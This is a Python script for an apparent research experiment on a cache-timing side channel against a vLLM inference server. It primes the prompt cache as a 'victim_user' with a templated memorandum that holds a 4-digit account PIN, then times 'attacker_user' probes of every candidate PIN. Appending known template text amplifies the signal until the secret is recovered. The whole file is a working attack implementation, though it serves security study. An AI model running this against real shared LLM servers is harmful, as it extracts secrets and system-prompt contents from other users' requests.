#!/usr/bin/env python
"""Experiment 14 - format-aware open-world recovery via suffix amplification.

The cache-timing signal is the UNCACHED SUFFIX after the first mismatch (Exp 13).
So to recover a bounded secret field embedded in a KNOWN template, the attacker
appends the known trailing boilerplate to every probe: a wrong field value
invalidates the cache for that whole suffix -> strong signal. We sweep the suffix
length to show the attack turn on: suffix=0 is the fine-grained wall (~chance); a
long known suffix -> ~100%. The attacker is assumed to know PREFIX and SUFFIX
(the template structure) but not the secret - realistic for templated prompts,
JSON-formatted prompts, and system prompts with embedded secrets.
Isolation: fresh chat+cache_salt namespace per trial.
"""
from __future__ import annotations
import argparse, random, statistics, sys, time, uuid
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))
from cachelab.config import Config
from cachelab.client import TimingClient
from cachelab.server import wait_until_healthy
from cachelab.io_utils import new_run_dir, save_json

PREFIX = ("Confidential settlement memorandum. The parties agree to the terms set forth herein "
          "and acknowledge the obligations described below. The designated account PIN for "
          "release authorization is ")
SUFFIX_BASE = (", and all wire transfers drawn against this account must be confirmed by both "
               "authorized signatories before any funds are disbursed to the approved vendor of record.")


def prime(client, cfg, text, salt):
    client.measure(cfg.model.name, text, max_tokens=1, user="victim_user", cache_salt=salt, chat=True)
    time.sleep(cfg.timing.inter_request_delay)


def probe(client, cfg, text, salt):
    m = client.measure(cfg.model.name, text, max_tokens=1, user="attacker_user", cache_salt=salt, chat=True)
    time.sleep(cfg.timing.inter_request_delay)
    return m.client_ttft if m.ok else None


def make_suffix(words):
    if words <= 0:
        return ""
    out = SUFFIX_BASE.split()
    k = 0
    while len(out) < words:
        out.append(f"clause{k}")
        k += 1
    return " ".join(out[:words])


def run(client, cfg, candidates, suffix, trials):
    correct = 0
    gaps = []
    for _ in range(trials):
        salt = f"fa-{uuid.uuid4().hex}"
        victim = random.randrange(len(candidates))
        prime(client, cfg, PREFIX + candidates[victim] + suffix, salt)
        ttfts = []
        for c in candidates:
            t = probe(client, cfg, PREFIX + c + suffix, salt)
            ttfts.append(t if t is not None else float("inf"))
        guess = min(range(len(candidates)), key=lambda i: ttfts[i])
        correct += int(guess == victim)
        fin = sorted(t for t in ttfts if t != float("inf"))
        if len(fin) >= 2:
            gaps.append(fin[1] - fin[0])
    return correct / trials, (statistics.median(gaps) if gaps else float("nan"))


def main() -> int:
    a = argparse.ArgumentParser()
    a.add_argument("--config", default="config/replication.yaml")
    a.add_argument("--candidates", type=int, default=10)
    a.add_argument("--trials", type=int, default=20)
    a.add_argument("--suffix-sweep", default="0,15,40,80,120")
    args = a.parse_args()
    cfg = Config.load(args.config)
    print("[*] waiting for vLLM server health...")
    if not wait_until_healthy(cfg):
        print("[!] server not healthy", file=sys.stderr)
        return 1
    client = TimingClient(cfg.server.base_url)
    rng = random.Random(1337)
    M = args.candidates
    cands = [f"{v:04d}" for v in rng.sample(range(0, 10000), M)]
    chance = 1.0 / M
    sweep = [int(x) for x in args.suffix_sweep.split(",") if x.strip() != ""]
    print(f"[*] secret = one of {M} 4-digit PINs; attacker knows PREFIX+SUFFIX, not the PIN")
    print(f"    suffix-length sweep (words): {sweep}")

    rows = []
    try:
        for sw in sweep:
            suf = make_suffix(sw)
            acc, gap = run(client, cfg, cands, suf, args.trials)
            win = acc > 2 * chance
            print(f"\n=== suffix = {sw} words ===")
            print(f"    recovery accuracy : {acc*100:5.1f}%   (chance = {chance*100:.1f}%)")
            print(f"    best-vs-2nd gap   : {gap*1000:5.2f} ms")
            print(f"    --> {'SECRET RECOVERED' if win else 'no better than chance'}")
            rows.append({"suffix_words": sw, "accuracy": acc, "gap_ms": round(gap * 1000, 3),
                         "chance": chance, "recovered": win})
    finally:
        client.close()

    run_dir = new_run_dir("runs")
    save_json({"experiment": "14_format_aware_recovery", "model": cfg.model.name,
               "candidates": M, "trials": args.trials, "sweep": rows}, run_dir / "format_aware.json")
    print(f"\n[*] wrote {run_dir/'format_aware.json'}")
    print("\n    Reading: appending the KNOWN template suffix amplifies a wrong guess into a long")
    print("    uncached region. Accuracy climbs from ~chance (no suffix = the fine-grained wall)")
    print("    to ~100% as the known suffix grows -- the attacker manufactures the signal.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
